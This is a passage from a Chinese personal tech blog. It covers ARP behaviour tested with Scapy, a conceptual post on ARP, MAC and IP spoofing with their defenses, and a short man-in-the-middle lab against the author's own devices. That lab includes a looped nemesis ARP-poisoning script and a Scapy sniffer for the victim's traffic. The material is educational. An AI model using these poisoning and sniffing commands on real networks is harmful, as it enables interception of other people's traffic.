<pre><code>&gt;&gt;&gt; arp_request = <span class="function"><span class="title">Ether</span><span class="params">(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)</span></span>/<span class="function"><span class="title">ARP</span><span class="params">(hwtype=<span class="number">0</span>x0001,ptype=<span class="number">0</span>x0800,op=<span class="number">0</span>x0001,hwsrc=<span class="string">'11:11:11:11:11:11'</span>, psrc=<span class="string">'172.16.0.22'</span>, pdst=<span class="string">'172.16.0.17'</span>)</span></span>
&gt;&gt;&gt; recv = <span class="function"><span class="title">srp</span><span class="params">(arp_request)</span></span>
</code></pre><p>则可以在另一台机器上的缓存表中发现<code>172.16.0.22</code>的项。说明操作系统默默接受了不请自来的请求。</p>
<p>为了查看ARP响应的效果，我们同时打开两边机器，创造一个请求。先清空windows机器的缓存表。</p>
<p>我们让windows机器ping<code>172.16.0.30</code>。同时开始抓包和准备应答(在win7上ping的同时执行下列命令)：</p>
<pre><code>&gt;&gt;&gt; arp_reply = <span class="function"><span class="title">Ether</span><span class="params">(src=<span class="string">'11:11:11:11:11:11'</span>, dst=<span class="string">'C8:1F:66:05:E2:6A'</span>)</span></span>/<span class="function"><span class="title">ARP</span><span class="params">(hwtype=<span class="number">0</span>x0001,ptype=<span class="number">0</span>x0800,op=<span class="number">0</span>x0002,hwsrc=<span class="string">'11:11:11:11:11:11'</span>, hwdst=<span class="string">'C8:1F:66:05:E2:6A'</span>, psrc=<span class="string">'172.16.0.30'</span>, pdst=<span class="string">'172.16.0.17'</span>)</span></span>
&gt;&gt;&gt; recv = <span class="function"><span class="title">srp</span><span class="params">(arp_reply, timeout=<span class="number">1</span>, iface=<span class="string">'eth0'</span>)</span><span class="title">Begin</span></span> emission:
Finished to send <span class="number">1</span> packets.
...
Received <span class="number">3</span> packets, got <span class="number">0</span> answers, remaining <span class="number">1</span> packets
</code></pre><p>可以观察到包的前两个正是我们想要的。</p>
<pre><code>~ ⮀ <span class="tag">sudo</span>  <span class="tag">tcpdump</span> <span class="tag">-nni</span> <span class="tag">eth0</span> <span class="tag">arp</span> 
<span class="tag">tcpdump</span>: <span class="tag">verbose</span> <span class="tag">output</span> <span class="tag">suppressed</span>, <span class="tag">use</span> <span class="tag">-v</span> <span class="tag">or</span> <span class="tag">-vv</span> <span class="tag">for</span> <span class="tag">full</span> <span class="tag">protocol</span> <span class="tag">decode</span>
<span class="tag">listening</span> <span class="tag">on</span> <span class="tag">eth0</span>, <span class="tag">link-type</span> <span class="tag">EN10MB</span> (<span class="tag">Ethernet</span>), <span class="tag">capture</span> <span class="tag">size</span> 65535 <span class="tag">bytes</span>
17<span class="pseudo">:28</span><span class="pseudo">:55</span><span class="class">.041968</span> <span class="tag">ARP</span>, <span class="tag">Request</span> <span class="tag">who-has</span> 172<span class="class">.16</span><span class="class">.0</span><span class="class">.30</span> <span class="tag">tell</span> 172<span class="class">.16</span><span class="class">.0</span><span class="class">.17</span>, <span class="tag">length</span> 46
17<span class="pseudo">:28</span><span class="pseudo">:55</span><span class="class">.165561</span> <span class="tag">ARP</span>, <span class="tag">Reply</span> 172<span class="class">.16</span><span class="class">.0</span><span class="class">.30</span> <span class="tag">is-at</span> 11<span class="pseudo">:11</span><span class="pseudo">:11</span><span class="pseudo">:11</span><span class="pseudo">:11</span><span class="pseudo">:11</span>, <span class="tag">length</span> 28
</code></pre><p>同时发现win7的arp缓存中已经有了<code>172.16.0.30</code>。</p>
<h2 id="ARP_Announcement">ARP Announcement</h2><p>这是一种特殊的ARP请求，目标协议地址填入发送者的协议地址，将目标硬件地址设为0.</p>
<p>或者，是一种特殊的ARP响应，目标协议地址和目标硬件地址都是发送者的协议和目标硬件地址。</p>
<p>ARP announcement意在更新其它收到这个包的机器的ARP缓存。这种免费的ARP(不请自来)常用来在机器启动或换网卡时通知其它机器。也用来做负载平衡。</p>
<pre><code>&gt;&gt;&gt; arp_announcement = <span class="function"><span class="title">Ether</span><span class="params">(src=<span class="string">'11:11:11:11:11:11'</span>, dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)</span></span>/<span class="function"><span class="title">ARP</span><span class="params">(hwtype=<span class="number">0</span>x0001,ptype=<span class="number">0</span>x0800,op=<span class="number">0</span>x0001,hwsrc=<span class="string">'11:11:11:11:11:11'</span>, hwdst=<span class="string">'00:00:00:00:00:00'</span>, psrc=<span class="string">'172.16.0.40'</span>, pdst=<span class="string">'172.16.0.40'</span>)</span></span>
&gt;&gt;&gt; recv = <span class="function"><span class="title">srp1</span><span class="params">(arp_announcement, timeout=<span class="number">2</span>)</span></span>
Begin emission:
Finished to send <span class="number">1</span> packets.

Received <span class="number">0</span> packets, got <span class="number">0</span> answers, remaining <span class="number">1</span> packets

 ~ ⮀ sudo  tcpdump -enni eth0 arp 
tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size <span class="number">65535</span> bytes
<span class="number">22</span>:<span class="number">15</span>:<span class="number">39.645293</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> &gt; ff:ff:ff:ff:ff:ff, ethertype ARP (<span class="number">0</span>x0806), length <span class="number">42</span>: Request who-has <span class="number">172.16</span>.<span class="number">0.40</span> tell <span class="number">172.16</span>.<span class="number">0.40</span>, length <span class="number">28</span>
</code></pre><p>遗憾的是，win7的ARP缓存没有接受<code>172.16.0.40</code>.</p>
<p>一个响应Announcement：</p>
<pre><code>&gt;&gt;&gt; arp_announcement = <span class="function"><span class="title">Ether</span><span class="params">(src=<span class="string">'11:11:11:11:11:11'</span>, dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)</span></span>/<span class="function"><span class="title">ARP</span><span class="params">(hwtype=<span class="number">0</span>x0001,ptype=<span class="number">0</span>x0800,op=<span class="number">0</span>x0002,hwsrc=<span class="string">'11:11:11:11:11:11'</span>, hwdst=<span class="string">'11:11:11:11:11:11'</span>, psrc=<span class="string">'172.16.0.40'</span>, pdst=<span class="string">'172.16.0.40'</span>)</span></span>
&gt;&gt;&gt; recv = <span class="function"><span class="title">srp1</span><span class="params">(arp_announcement, timeout=<span class="number">2</span>)</span></span>

 ~ ⮀ sudo  tcpdump -enni eth0 arp 
tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size <span class="number">65535</span> bytes
<span class="number">22</span>:<span class="number">18</span>:<span class="number">21.655256</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> &gt; ff:ff:ff:ff:ff:ff, ethertype ARP (<span class="number">0</span>x0806), length <span class="number">42</span>: Reply <span class="number">172.16</span>.<span class="number">0.40</span> is-at <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>, length <span class="number">28</span>
</code></pre><h2 id="ARP_probe">ARP probe</h2><p>ARP探针是一个全0 IP地址的广播请求，用来检测IPv4地址冲突。在开始使用一个IP地址之前，实现这个规范(RFC5227)的主机必须通过ARP探针测试地址是否被使用。</p>
<p>具体过程参见RFC5227.</p>
<blockquote>
<p>A host probes to see if an address is already in use by broadcasting<br>an ARP Request for the desired address.  The client MUST fill in the<br>‘sender hardware address’ field of the ARP Request with the hardware<br>address of the interface through which it is sending the packet.  The<br>‘sender IP address’ field MUST be set to all zeroes; this is to avoid<br>polluting ARP caches in other hosts on the same link in the case<br>where the address turns out to be already in use by another host.<br>The ‘target hardware address’ field is ignored and SHOULD be set to<br>all zeroes.  The ‘target IP address’ field MUST be set to the address<br>being probed.  An ARP Request constructed this way, with an all-zero<br>‘sender IP address’, is referred to as an ‘ARP Probe’.</p>
</blockquote>
<p>类似这样：</p>
<pre><code><span class="prompt">&gt;&gt;</span>&gt; arp_probe = (<span class="constant">Ether</span>(dst=<span class="string">'ff:ff:ff:ff:ff:ff'</span>)/<span class="constant">ARP</span>(psrc=<span class="string">'0.0.0.0'</span>, pdst=<span class="string">'172.16.0.17'</span>))
<span class="prompt">&gt;&gt;</span>&gt; arp_probe.show()
<span class="comment">###[ Ethernet ]###</span>
  dst= <span class="symbol">ff:</span><span class="symbol">ff:</span><span class="symbol">ff:</span><span class="symbol">ff:</span><span class="symbol">ff:</span>ff
  src= <span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span>
  type= <span class="number">0x806</span>
<span class="comment">###[ ARP ]###</span>
     hwtype= <span class="number">0x1</span>
     ptype= <span class="number">0x800</span>
     hwlen= <span class="number">6</span>
     plen= <span class="number">4</span>
     op= who-has
     hwsrc= <span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span>
     psrc= <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>
     hwdst= <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span>
     pdst= <span class="number">172.16</span>.<span class="number">0</span>.<span class="number">17</span>
<span class="prompt">&gt;&gt;</span>&gt; recv = srp(arp_probe, iface=<span class="string">'eth0'</span>)
<span class="constant">Begin</span> <span class="symbol">emission:</span>
<span class="constant">Finished</span> to send <span class="number">1</span> packets.
*
<span class="constant">Received</span> <span class="number">1</span> packets, got <span class="number">1</span> answers, remaining <span class="number">0</span> packets
</code></pre><p>开始监听然后发送：</p>
<pre><code> ~ ⮀ <span class="tag">sudo</span>  <span class="tag">tcpdump</span> <span class="tag">-nni</span> <span class="tag">eth0</span> <span class="tag">arp</span> 
<span class="tag">tcpdump</span>: <span class="tag">verbose</span> <span class="tag">output</span> <span class="tag">suppressed</span>, <span class="tag">use</span> <span class="tag">-v</span> <span class="tag">or</span> <span class="tag">-vv</span> <span class="tag">for</span> <span class="tag">full</span> <span class="tag">protocol</span> <span class="tag">decode</span>
<span class="tag">listening</span> <span class="tag">on</span> <span class="tag">eth0</span>, <span class="tag">link-type</span> <span class="tag">EN10MB</span> (<span class="tag">Ethernet</span>), <span class="tag">capture</span> <span class="tag">size</span> 65535 <span class="tag">bytes</span>
22<span class="pseudo">:08</span><span class="pseudo">:56</span><span class="class">.885470</span> <span class="tag">ARP</span>, <span class="tag">Request</span> <span class="tag">who-has</span> 172<span class="class">.16</span><span class="class">.0</span><span class="class">.17</span> <span class="tag">tell</span> 0<span class="class">.0</span><span class="class">.0</span><span class="class">.0</span>, <span class="tag">length</span> 28
22<span class="pseudo">:08</span><span class="pseudo">:56</span><span class="class">.885831</span> <span class="tag">ARP</span>, <span class="tag">Reply</span> 172<span class="class">.16</span><span class="class">.0</span><span class="class">.17</span> <span class="tag">is-at</span> <span class="tag">c8</span><span class="pseudo">:1f</span><span class="pseudo">:66</span><span class="pseudo">:05</span><span class="pseudo">:e2</span><span class="pseudo">:6a</span>, <span class="tag">length</span> 46
</code></pre><p>说明有<code>172.16.0.17</code>这个地址。但可以检查一下，<code>0.0.0.0</code>并没有污染win7机器的arp缓存。</p>
<h2 id="ARP_mediation">ARP mediation</h2><p>在VPN中不同网络架构时使用ARP。略</p>
<h2 id="ARP_Stuffing">ARP Stuffing</h2><p>某些嵌入式系统，没有配置界面，用户无法使用地址分配协议，设备没有合适的IP地址，这时候主机人工填充一个IP地址到它的地址表，然后向设备发送特殊的包。设备于是采用这个IP地址和主机通信。</p>
<h2 id="ARP_Suppression">ARP Suppression</h2><p>禁用主机ARP，要求配置静态ARP缓存才能通信：</p>
<pre><code>ip link <span class="keyword">set</span> dev eth0 arp <span class="keyword">off</span>
<span class="comment"># ifconfig wlan0 -arp</span>
</code></pre><h2 id="ARP_Proxy">ARP Proxy</h2><p>同一个IP网段被某台设备分成两个部分。arp代理可以让两端的机器好像在同一以太网内工作一样。</p>
<p>举如下例子。</p>
<p>当我们有一台linux机器。其中wlan0连接无线路由，另外有一台win7机器，没有无线网卡，和linux机器的eth0直接用网线相连。</p>
<pre><code><span class="comment">Internet</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">无线路由</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">wlan0</span> <span class="title">[</span><span class="comment">Linux</span><span class="title">]</span> <span class="comment">eth0</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">windows</span> <span class="comment">7</span>
</code></pre><p>为了让windows7机器能够联网，我们可以设置windows7机器和linux机器在同一网段。比如设置：</p>
<p>先设置ip地址：</p>
<ul>
<li>路由器网关地址<code>192.168.1.1</code></li>
<li>linux在wlan0被路由器分配地址，<code>192.168.1.103</code>，子网掩码<code>255.255.255.0</code></li>
<li>windows7机器设置静态ip<code>192.168.1.114</code>，子网掩码<code>255.255.255.0</code></li>
</ul>
<p>下面我们开始设置ARP代理，在linux机器上设置内核允许代理和转发：</p>
<pre><code>gentoo ~ # echo <span class="number">1</span> &gt; /<span class="keyword">proc</span>/sys/net/ipv4/conf/eth0/proxy_arp<span class="symbol">
gentoo</span> ~ #<span class="symbol"> echo</span> 1 &gt; /<span class="keyword">proc</span>/sys/net/ipv4/conf/wlan0/proxy_arp<span class="symbol">
gentoo</span> ~ #<span class="symbol"> echo</span> 1 &gt; /<span class="keyword">proc</span>/sys/net/ipv4/ip_forward
</code></pre><p>在wlan0上对应其MAC设置想要代理的对象的静态地址(<code>192.168.1.114</code>)，让linux对wlan0上以太网响应对<code>192.168.1.114</code>的响应，并把自己的无线网卡MAC作为响应内容。</p>
<pre><code>sudo arp -i wlan0 -s <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> pub
</code></pre><p>可以选择是否设置下一步，即使在eth0上没有ip地址也可以。</p>
<p>设置eth0接口上的ip地址(默认netmask是<code>255.255.255.0</code>)：</p>
<pre><code>sudo ifconfig eth0 inet <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>
</code></pre><p>添加路由：</p>
<pre><code>sudo route add <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span> eth0
</code></pre><p>linux和windows机器互ping以确保连接：</p>
<pre><code>⮀ ~ ⮀ ping -c <span class="number">2</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span>
PING <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span> (<span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span>) <span class="number">56</span>(<span class="number">84</span>) bytes of data.
<span class="number">64</span> bytes from <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">128</span> time=<span class="number">0.446</span> ms
<span class="number">64</span> bytes from <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span>: icmp_seq=<span class="number">2</span> ttl=<span class="number">128</span> time=<span class="number">0.469</span> ms

--- <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span> ping statistics ---
<span class="number">2</span> packets transmitted, <span class="number">2</span> received, <span class="number">0</span>% packet loss, time <span class="number">999</span>ms
rtt min/avg/max/mdev = <span class="number">0.446</span>/<span class="number">0.457</span>/<span class="number">0.469</span>/<span class="number">0.024</span> ms
</code></pre><p>对<code>eth0</code>上将自己的有线网卡MAC设置为对<code>192.168.1.1</code>的响应。</p>
<pre><code>sudo arp -i eth0 -s <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="number">00</span>:<span class="number">24</span>:<span class="number">54</span>:<span class="number">9</span>a:<span class="number">05</span>:<span class="number">8</span>b pub
</code></pre><p>接着在windows7上尝试<code>ping</code>一下<code>192.168.1.1</code>：</p>
<p>如果在windows7机器上设置了正确的dns，就可以直接上网了。</p>
<h2 id="Reference">Reference</h2><ul>
<li><a href="en.wikipedia.org/wiki/Address_Resolution_Protocol">Address Resolution Protocol</a></li>
<li><a href="http://linux-ip.net/html/ether-arp.html" target="_blank" rel="external">Address Resolution Protocol (ARP)</a></li>
<li><a href="http://linux.vbird.org/linux_server/0230router.php#arp_proxy" target="_blank" rel="external">特殊狀況：路由器兩邊界面是同一個 IP 網段： ARP Proxy</a></li>
</ul>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/security/2014/02/26/spoofing/" itemprop="url">
                  网络上的欺骗
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-02-26T00:00:00+08:00" content="2014-02-26">
              2014-02-26
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/security/" itemprop="url" rel="index">
                    <span itemprop="name">security</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/security/2014/02/26/spoofing/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="security/2014/02/26/spoofing/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>首先，我们来被维基百科科普一下。然后试着执行一次中间人攻击。</p>
<h1 id="理论基础">理论基础</h1><ul>
<li><p>理解计算机网络分层架构。</p>
</li>
<li><p>习惯于主动使用搜索引擎寻找知识</p>
</li>
</ul>
<p>以下内容来自维基百科</p>
<h1 id="Arp_Spoofing">Arp Spoofing</h1><p>是一种攻击者在局域网上发送伪造的ARP消息的技术。通常是为了将另一个主机的IP地址关联到攻击者的MAC地址上。使那个主机的IP地址的流量定向到攻击者那里。</p>
<p>ARP欺骗使攻击者截取本地局域网(LAN)上的数据帧，更改流量或者阻止流量。通常作为其它攻击方式比如拒绝服务攻击(DOS)，中间人攻击(MITM)或者会话劫持的开始。</p>
<p>攻击局限在使用ARP协议的局域网上。</p>
<p>局域网通信需要把网络层的IP地址转换成数据链路层的MAC地址<br>来在数据链路层传输。当知道一个主机的IP地址后，就需要通过一个广播来获取其MAC地址(ARP request)。这个主机响应(ARP reply)中包含这个IP的MAC地址。</p>
<p>ARP协议没有状态，主机会自动缓存任何它们收到的ARP reply，无论是否它们请求过。即使没有过期的ARP缓存也会被新ARP响应覆盖。主机无法认证包的来源。</p>
<p>通常，一次ARP攻击可能来自被侵害的机器或者直接是攻击者的主机。通常，攻击的目标是将攻击者的MAC地址关联到目标机器的IP地址，于是意味着发送到目标的流量就被送到攻击者的那里。攻击者可以：</p>
<ul>
<li>截取数据，然后原封不动转发给目标。(窃听)</li>
<li>更改数据内容再转发给目标(MITM)</li>
<li>通过丢弃所有或部分包对目标发起DOS攻击</li>
</ul>
<p>防御措施有：</p>
<ul>
<li>静态ARP表。</li>
<li>一些软件通过某种形式的认证或交叉检查ARP响应的方式。DHCP服务器、独立主机、Ethernet交换机或其它网络设备都能有这种功能。比如多IP关联到一个MAC地址可能就预示着ARP欺骗。</li>
<li>操作系统反应不一。Linux忽略任何不请自来的响应，但使用其它机器的可见请求来更新缓存。Solaris只在超时后更新缓存条目。Windows中，可以在<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters, ArpCacheLife, ArpCacheMinReferenceLife, ArpUseEtherSNAP, ArpTRSingleRoute, ArpAlwaysSourceRoute, ArpRetryCount</code>配置。</li>
<li>主机防御。可能拒绝任何和缓存中MAC地址不同的应答更新，可能接受不同的但会探测之前的MAC地址是否还在。这些是基于已有的缓存中MAC地址是合法的基础上。<a href="一般通过dhcp服务器分配ip地址的大概就没什么问题。不过要是伪造dhcp服务器……啧啧……">^4</a></li>
<li>被动探测。探测网络上的ARP请求和响应建立一个IP-MAC数据库</li>
<li>DHCP服务器在分配IP后建立和维护对应的列表供网关使用。</li>
</ul>
<h1 id="Mac_Spoofing">Mac Spoofing</h1><p>是一种更改一个网络设备上接口的MAC(Media Access Control)地址的技术。MAC地址硬编码到网卡(NetWork Interface Controller)中无法更改，然而，有办法让操作系统相信网卡使用了用户指定的MAC地址。通常这更改了一个电脑的身份，然而相当简单。</p>
<p>通常为了绕过服务器或路由器的访问控制列表，或者隐藏一台电脑或者冒充其它网络设备。看情况有时候合法有时候非法。</p>
<ul>
<li>为了在使用绑定MAC的ISP上使用新硬件或多个硬件。不过攻击者也能使用该技术。</li>
<li>为了满足某些绑定MAC地址的软件要求</li>
<li>身份隐藏以保护隐私。Wi-Fi连接MAC地址并不加密。因此monitor模式下网卡很容易搜集MAC地址。为了不被追踪可以使用MAC欺骗，然而攻击者可以用此技术冒充认证用户实行非法活动，并且难以探测。</li>
</ul>
<p>MAC欺骗的主机通常可以收到信息(有些特别安全交换机配置可以阻止这种包的传输)<a href="我拿自己手机试了下，大概这种特安全的地方很少吧。">^2</a>，然而，MAC地址伪造局限在局部广播域。<a href="[这里解释了为啥是在局域网内](http://stackoverflow.com/questions/10633753/nmap-not-retrieving-mac-address-and-vendor)">^3</a></p>
<h1 id="IP_Spoofing">IP Spoofing</h1><p>是在IP协议包中伪造源地址的一种行为。其一是为了隐藏伪造者的身份，一是为了假扮成其它机器。</p>
<p>攻击者通过更改IP包头源地址段，使之好像来源于其它机器。收到伪造包的机器就向错误的机器返回包。通常攻击者不在乎返回的包，或者他们可以可靠地探测响应。</p>
<p>特定情况下可能攻击者可以看到或把数据包重定向到他自己的机器。这在本地局域网或本地无线局域网上常常发生。</p>
<p>IP欺骗常用来进行DOS攻击，因为包来自不同地址，它让过滤变得不易。这让基于IP的防御不再有效。Backscatter是一种基于无效地址包的统计技术，然而更复杂的攻击还能避免无效的地址。</p>
<p>IP欺骗也被用来绕过基于IP的认证。虽然这种方法会一次更改上千的包使之在攻击远端系统时实施非常困难，但在受信任的内网机器之间却很有效</p>
<p>IP欺骗有时候也用作网站性能测试。</p>
<p>易受IP欺骗的服务有：</p>
<ul>
<li>RPC</li>
<li>任何基于IP的认证</li>
<li>X window系统</li>
<li>R(emote)系列服务比如rlogin，rsh</li>
</ul>
<h3 id="防御方式">防御方式</h3><ul>
<li>包过滤。网关对出口或者入口包进行IP地址过滤，比如urpf(unicast Reverse Path Forwarding)。</li>
<li>设计不是基于IP的网络协议和服务</li>
<li>一些上层协议提供一些抵御。比如TCP使用序号来和远端机器通信来确保到达的包是已经建立连接的一部分。因攻击者通常看不到任何回应包，必须猜测序号来劫持连接。一些较老的系统或网络设备的TCP序号可以被预测。</li>
</ul>
<h1 id="Email_Spoofing">Email Spoofing</h1><p>以后再看，其实某次我们内网搭建的git服务器给我邮箱发了邮件并且收到时就想到了这个。</p>
<h1 id="URL_Spoofing">URL Spoofing</h1><p>以后再说吧，想起了乌云上那篇猥琐流URL hacking。</p>
<h1 id="FireWall">FireWall</h1><p>从发展史来看，防火墙的发展分为三代：</p>
<ol>
<li><p>包过滤。这一代防火墙仅仅对单个的包进行过滤。如果发现匹配的规则则丢弃(悄悄丢包)或者拒绝(返回错误)这个包。通常这些规则是包源地址、目的地址、协议、和比如针对TCP和UDP的端口。它没有关于连接的任何信息，是无状态的。</p>
<p> 该代防火墙主要工作在下三层并稍微偷看下传输层的源和目的地址及端口。</p>
</li>
<li><p>有状态的过滤。不仅有第一代防火墙的功能，还工作到OSI第四层传输层上，会把<code>连接状态</code>作为一个评价标准。它会保留直到接受足够的包来决定它的连接状态。它记录所有经过的连接并决定是否一个包是新连接的开始或是已存在连接的一部分或者不是。</p>
</li>
<li><p>应用级防火墙<a href="SDN么这是？">^1</a>。这种防火墙工作在应用层。它能够理解上层协议，所以，可以去探测是否一个非法的协议在试图通过合法的端口穿越防火墙。传说中的下一代防火墙(NGFW)就是扩展和深化应用层栈的检查。</p>
</li>
</ol>
<p>防火墙可以根据通信被截取的位置和被追踪的状态分类：</p>
<ul>
<li><p>网络层或包过滤<br> 主要工作在相对底层的TCP/IP层，靠规则过滤。有两种：</p>
<ul>
<li>有状态：存储当前连接阶段，源目的地址端口。若一个包不属于已经存在的连接，通过新连接的规则评价它。如果一个包属于已知的连接，则按所在连接处理方式处理</li>
<li>无状态。需要更少内存、更快。适于处理无连接的协议。然而不能基于通信状态做出复杂决定。<br>一个例子就是iptables</li>
</ul>
</li>
<li><p>应用层防火墙：通过套接字截取进程间通信，使用各种规则过滤。无法抵御底层的漏洞挖掘，正在被一种强制访问控制(MAC)应用防火墙取代，即沙盒。</p>
</li>
<li><p>代理：无论是专用的硬件或者软件，通过以应用的方式响应输入的包起作用。代理服务器是一个网络到另一个特定网络应用的网关，代表网络中的用户来行事。代理服务器使内网和外网隔离更彻底，但攻击者也可以通过使用一台机器当作代理攻击内部网络。</p>
</li>
<li><p>NAT——网络地址转换：防火墙通常有这些功能，防火墙后的机器通常拥有私有IP地址。本来用来减缓ipv4地址不够用的危机的措施，却意外成为一种反网络侦查的重要防御手段。</p>
</li>
</ul>
<h1 id="Rogue_DHCP">Rogue DHCP</h1><p>伪造DHCP服务器，暂略。</p>
<h1 id="DNS系列">DNS系列</h1><p>放到DNS里来讲</p>
<hr>
<p>下面，尝试一次中间人攻击，我是在WLAN内打开自己手机和笔记本。</p>
<p>0.0 mac spoofing</p>
<pre><code>~ ⮀ sudo ip link <span class="built_in">set</span> eth0 down
~ ⮀ sudo ip link <span class="built_in">set</span> dev eth0 address <span class="number">38</span>:AA:<span class="number">3</span>C:E6:FE:<span class="number">69</span>
~ ⮀ ip link <span class="built_in">set</span> eth0 up
</code></pre><p>0.1 prepare</p>
<pre><code>~ ⮀ ifconfig wlan0 promisc
~ ⮀ echo <span class="number">1</span> &gt; /<span class="keyword">proc</span>/sys/net/ipv4/ip_forward
</code></pre><ol>
<li><p>find target machine</p>
<p> ~ ⮀ sudo nmap -sS 192.168.1.0/24</p>
</li>
<li><p>arps it</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">sudo nemesis arp -v -r <span class="operator">-d</span> wlan0 -S <span class="number">192.168</span>.<span class="number">1.102</span> -D <span class="number">192.168</span>.<span class="number">1.1</span> -h E8:<span class="number">39</span>:DF:<span class="number">08</span>:F4:FB -m EC:<span class="number">88</span>:<span class="number">8</span>F:B4:D6:<span class="number">68</span> -H  E8:<span class="number">39</span>:DF:<span class="number">08</span>:F4:FB -M EC:<span class="number">88</span>:<span class="number">8</span>F:B4:D6:<span class="number">68</span></span><br><span class="line"></span><br><span class="line">sudo nemesis arp -v -r <span class="operator">-d</span> wlan0 -S <span class="number">192.168</span>.<span class="number">1.1</span> -D <span class="number">192.168</span>.<span class="number">1.102</span> -h E8:<span class="number">39</span>:DF:<span class="number">08</span>:F4:FB -m <span class="number">68</span>:<span class="number">5</span>D:<span class="number">43</span>:<span class="number">2</span>E:AA:<span class="number">59</span> -H  E8:<span class="number">39</span>:DF:<span class="number">08</span>:F4:FB -M <span class="number">68</span>:<span class="number">5</span>D:<span class="number">43</span>:<span class="number">2</span>E:AA:<span class="number">59</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<ol>
<li><p>listen it</p>
<p> pkts = sniff(filter=”tcp and host 192.168.1.102”,iface=”wlan0”, prn=lambda x: sprintf(“{IP:%IP.src% -&gt; %IP.dst%\n}{Raw:%Raw.load%\n}”))</p>
</li>
<li><p>check it</p>
</li>
</ol>
<h2 id="Footnotes">Footnotes</h2>
            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/Life/2014/02/18//" itemprop="url">
                  生命游戏
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-02-18T00:00:00+08:00" content="2014-02-18">
              2014-02-18
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/Life/" itemprop="url" rel="index">
                    <span itemprop="name">Life</span>
                  </a>
                </span>

                
